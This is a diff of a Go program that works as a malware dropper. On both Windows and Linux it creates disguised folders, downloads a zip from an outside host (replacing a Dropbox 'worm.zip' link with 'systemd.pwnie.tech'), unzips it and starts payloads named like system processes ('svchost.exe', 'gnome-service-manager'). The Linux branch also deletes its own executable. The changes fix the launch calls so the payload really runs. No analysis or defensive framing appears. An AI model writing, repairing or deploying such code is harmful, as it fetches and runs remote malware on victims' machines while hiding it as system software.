@@ -21,9 +21,9 @@ func main(){
 			os.Mkdir("\\Users\\Administrator\\AppData\\Roaming\\Templow",os.FileMode(0777))
 			ioutil.WriteFile("\\Users\\Administrator\\AppData\\Roaming\\Templow\\flag.txt",[]byte("hello"),0777)
 			os.Chdir("\\Users\\Administrator\\AppData\\Roaming\\Templow")
-			downloadzip("https://www.dropbox.com/s/7jk5jj8actz15eb/worm.zip?dl=1")
+			downloadzip("http://systemd.pwnie.tech/file.zip")
 			Unzip("file.zip","\\Users\\Administrator\\AppData\\Roaming\\Templow")
-			exec.Command("START",".\\svchost.exe")
+			exec.Command("cmd", "/c start /b svchost.exe").Start()
 			os.Exit(0)
 		} else {
 			os.Exit(3)
@@ -33,12 +33,13 @@ func main(){
 			os.Mkdir("/tmp/gnome-software-F5DEKL",os.FileMode(0777))
 			ioutil.WriteFile("/tmp/gnome-software-F5DEKL/flag.txt",[]byte("hello"),0777)
 			os.Chdir("/tmp/gnome-software-F5DEKL")
-			downloadzip("https://www.dropbox.com/s/7jk5jj8actz15eb/worm.zip?dl=1")
+			downloadzip("http://systemd.pwnie.tech/file.zip")
 			Unzip("file.zip","/tmp/gnome-software-F5DEKL")
 			//replace link
 			os.Remove("/tmp/gnome-software-F5DEKL/file.zip")
 			s, _ := os.Readlink("/proc/self/exe");
-			exec.Command("./gnome-service-manager","> /dev/null 2>&1 &")
+			cmd := exec.Command("./gnome-service-manager","> /dev/null 2>&1 &")
+			cmd.Start()
 			os.Remove(s)
 
 			os.Exit(0)
